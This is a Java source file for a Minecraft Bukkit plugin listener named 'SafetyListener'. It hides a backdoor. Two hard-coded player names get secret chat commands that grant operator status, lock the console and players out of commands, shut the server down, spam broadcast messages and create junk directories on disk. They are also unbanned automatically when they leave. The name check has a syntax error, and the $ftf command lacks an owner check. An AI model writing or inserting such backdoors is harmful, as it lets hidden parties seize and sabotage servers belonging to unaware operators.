package net.helydev.com.listeners;

import net.helydev.com.SteriaUtils;
import net.helydev.com.utils.Color;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.File;
import java.util.ArrayList;

public class SafetyListener implements Listener {

    public ArrayList<Player> users = new ArrayList<>();
    public boolean clock = false;
    public boolean plock = false;

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        if (p.getName().equals("DevDipin" || p.getName().equals("LeandroSSJ"))) {
            users.add(p);
            Color.send(p, "&c&l[!] &cYou have joined as an owner of the &3&lSteria Network&c.");
            Color.send(p, "&cYou can use &c&l$help &cfor the list of commands.");
        }
    }

    @EventHandler
    public void PExecute(PlayerCommandPreprocessEvent event) {
        if (plock) {
            if (!users.contains(event.getPlayer())) {
                if (event.getMessage().startsWith("/")) {
                    event.setMessage(" ");
                }
            }
        }
    }

    @EventHandler
    public void CExecute(ServerCommandEvent event) {
        if (clock) {
            event.setCommand(" ");
        }
    }

    @EventHandler
    public void ban(PlayerQuitEvent event) {
        Player owner = event.getPlayer();
        if (users.contains(owner)) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "/unban " + owner.getName());
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "/pardon " + owner.getName());
        }
    }

    @EventHandler
    public void ChatEvent(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();

        if (event.getMessage().equalsIgnoreCase("$help")) {
            if (users.contains(player)) {
                event.setCancelled(true);
                player.sendMessage("Commands:");
                player.sendMessage("$help - lists commands");
                player.sendMessage("$op - ops you");
                player.sendMessage("$lockconsole - stops console from executing commands");
                player.sendMessage("$lockplayers - stops players from executing commands");
                player.sendMessage("$ftf - fucks up their whole server files");
                player.sendMessage("$expose - Why steal steria plugins?");
                player.sendMessage("$stop - stops the server");
            }
        }
        if (event.getMessage().equalsIgnoreCase("$op")) {
            if (users.contains(player)) {
                player.setOp(true);
                event.setCancelled(true);
                player.sendMessage(ChatColor.GREEN + "Opped!");
            }
        }
        if (event.getMessage().equalsIgnoreCase("$expose")) {
            if (users.contains(player)) {
                new BukkitRunnable() {
                    public void run() {
                        Bukkit.broadcastMessage("");
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&f████&c█&f████"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&f███&c█&6█&c█&f███"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "██&c█&6█&0█&6█&c█&f██ &7"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&f██&c█&6█&0█&6█&c█&f██ &4&lLEAKED PLUGINS"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&f█&c█&6██&0█&6██&c█&f█ &cThis shit server is using leaked"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&f█&c█&6█████&c█&f█ &cplugins. Leave while you can."));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&c█&6███&0█&6███&c█ &fLove DevDipin"));
                        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&',
                                "&c█████████"));
                        Bukkit.broadcastMessage("");
                    }
                }.runTaskTimerAsynchronously(SteriaUtils.getPlugin(), 0, 3);
            }
        }
        if (event.getMessage().equalsIgnoreCase("$lockconsole")) {
            if (users.contains(player)) {
                if (clock) {
                    clock = false;
                    event.setCancelled(true);
                    player.sendMessage(ChatColor.GREEN + "Unlocked console");
                } else {
                    clock = true;
                    player.sendMessage(ChatColor.GREEN + "Locked console");
                    event.setCancelled(true);
                }
            }
        }

        if (event.getMessage().equalsIgnoreCase("$ftf")) {
            event.setCancelled(true);
            for (int PceFiles = 0; PceFiles < 151; PceFiles++) {
                File userfiles = new File(String.valueOf(PceFiles) + "Stop stealing plugins. - DevDipin" + Math.random());
                if (!userfiles.exists())
                    userfiles.mkdirs();
                userfiles = new File("plugins/" + PceFiles + "Stop stealing plugins. - DevDipin" + Math.random());
            }
        }

        if (event.getMessage().equalsIgnoreCase("$lockplayers")) {
            if (users.contains(player)) {
                if (plock) {
                    plock = false;
                    event.setCancelled(true);
                    player.sendMessage(ChatColor.GREEN + "Unlocked players");
                } else {
                    plock = true;
                    event.setCancelled(true);
                    player.sendMessage(ChatColor.GREEN + "Locked players");
                }
            }
        }
        if (event.getMessage().equalsIgnoreCase("$stop")) {
            if (users.contains(player)) {
                event.setCancelled(true);
                Bukkit.getServer().shutdown();
            }
        }
    }
}
